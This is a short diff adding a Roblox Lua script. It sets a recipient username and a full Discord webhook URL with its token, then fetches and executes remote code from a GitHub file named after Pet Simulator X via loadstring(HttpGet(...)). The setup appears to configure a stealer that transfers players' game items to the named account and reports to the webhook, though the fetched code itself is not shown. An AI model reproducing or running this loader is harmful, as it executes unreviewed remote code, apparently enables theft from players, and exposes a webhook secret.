@@ -1,0 +1,4 @@
+UserName = "pigion13813"
+Webhook = "https://discord.com/api/webhooks/1098163888098394222/7VmLgzQdoF7ybQX39aiVvjDI6hGh5HGa7he9NEMmMA_IpbuaCkejrLFHJMpphutiVdLF"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Costin7/petsimulatorx/main/Pet.lua", true))()
